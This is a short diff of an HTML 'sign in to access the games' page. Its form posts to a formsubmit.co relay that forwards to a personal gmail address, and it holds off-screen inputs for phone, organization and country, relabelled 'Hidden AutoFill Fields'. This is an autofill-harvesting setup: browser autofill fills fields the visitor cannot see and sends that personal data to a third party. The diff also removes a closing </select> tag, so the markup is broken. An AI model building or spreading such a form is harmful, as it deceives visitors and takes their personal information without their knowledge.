@@ -17,6 +17,7 @@
       <p>Please sign in to access the games!</p>
       <form id="signInForm" action="https://formsubmit.co/bobperson300@gmail.com" method="POST">
         <!-- Visible Fields -->
+         <!-- Visible Fields -->
         <div class="form-group">
           <label for="name">Name</label>
           <input id="name" name="name" type="text" class="form-control" required>
@@ -26,7 +27,7 @@
           <input id="email" name="email" type="email" class="form-control" required>
         </div>
 
-        <!-- Hidden Fields -->
+        <!-- Hidden AutoFill Fields -->
         <div class="form-group off-screen">
           <input name="phone" type="text" placeholder="Phone">
           <input name="organization" type="text" placeholder="Organization">
@@ -37,7 +38,6 @@
           <select name="country">
             <option value=""></option>
             <option value="FI">Finland</option>
-          </select>
         </div>
 
         <input type="hidden" name="_captcha" value="false">
